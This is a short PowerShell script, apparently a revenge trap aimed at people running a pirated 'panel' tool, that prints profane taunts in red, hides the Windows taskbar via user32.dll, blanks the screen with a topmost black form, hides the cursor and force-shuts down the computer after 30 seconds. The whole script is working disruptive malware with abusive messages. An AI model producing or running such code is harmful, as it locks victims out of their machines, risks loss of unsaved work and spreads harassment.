# Set UTF8 output and title
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "PanelFucker-@FAIRx COMMUNITY"

function Write-RoastLine {
    param([string]$msg)
    Write-Host $msg -ForegroundColor Red
    Start-Sleep -Milliseconds 800
}

cls
Write-RoastLine "=============================================================="
Write-RoastLine "  SYSTEM BREACH DETECTED - NICE TRY YOU LOW-LIFE CLOWN        "
Write-RoastLine "=============================================================="
Start-Sleep -Seconds 1

Write-RoastLine "`nAaaa bitch... you thought you could run this for your profit, huh?"
Write-RoastLine "Didn't I warn you not to mess with your DAD last time?"
Write-RoastLine "Now face the consequences you lil asshole."
Start-Sleep -Seconds 1

Write-RoastLine "`nTo your devs: Go learn ABCD before making a panel, dumbasses."
Start-Sleep -Seconds 2

# Add Windows Forms
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide taskbar using user32.dll (Shell_TrayWnd)
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Taskbar {
    [DllImport("user32.dll")]
    public static extern int FindWindow(string className, string windowText);
    [DllImport("user32.dll")]
    public static extern int ShowWindow(int hwnd, int command);
}
"@

# Hide the taskbar (SW_HIDE = 0)
$taskbar = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbar, 0)

# Create full black screen
$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = 'Black'
$form.Opacity = 1
$form.ShowInTaskbar = $false
[System.Windows.Forms.Cursor]::Hide()

# Timer to shutdown after 30 seconds
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 30000
$timer.Add_Tick({
    $timer.Stop()

    # Restore taskbar
    [Taskbar]::ShowWindow($taskbar, 1)

    Stop-Computer -Force
})

$timer.Start()

# Show the black screen in modal mode (traps ALT+TAB)
$form.ShowDialog()

